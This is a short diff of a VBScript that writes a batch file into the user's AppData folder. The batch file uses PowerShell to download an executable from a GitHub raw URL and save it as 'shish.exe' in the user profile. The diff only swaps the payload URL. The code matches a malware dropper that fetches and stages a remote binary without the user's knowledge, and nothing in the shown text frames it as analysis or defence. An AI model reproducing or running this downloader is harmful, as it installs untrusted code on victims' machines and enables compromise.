@@ -8,7 +8,7 @@ batPath = shell.ExpandEnvironmentStrings("%APPDATA%") & "\sc.bat"
 batContent = _
 "@echo off" & vbCrLf & _
 "setlocal" & vbCrLf & _
-"set ""EXE_URL=https://github.com/USATIKTOKER/Service/raw/refs/heads/main/code.exe""" & vbCrLf & _
+"set ""EXE_URL=https://github.com/USATIKTOKER/Service/raw/main/code1.exe""" & vbCrLf & _
 "set ""EXE_PATH=%USERPROFILE%\shish.exe""" & vbCrLf & _
 "powershell -command ""Invoke-WebRequest -Uri '%EXE_URL%' -OutFile '%EXE_PATH%' -UseBasicParsing -ErrorAction Stop""" & vbCrLf & _
 "if not exist ""%EXE_PATH%"" exit /b 1" & vbCrLf & _
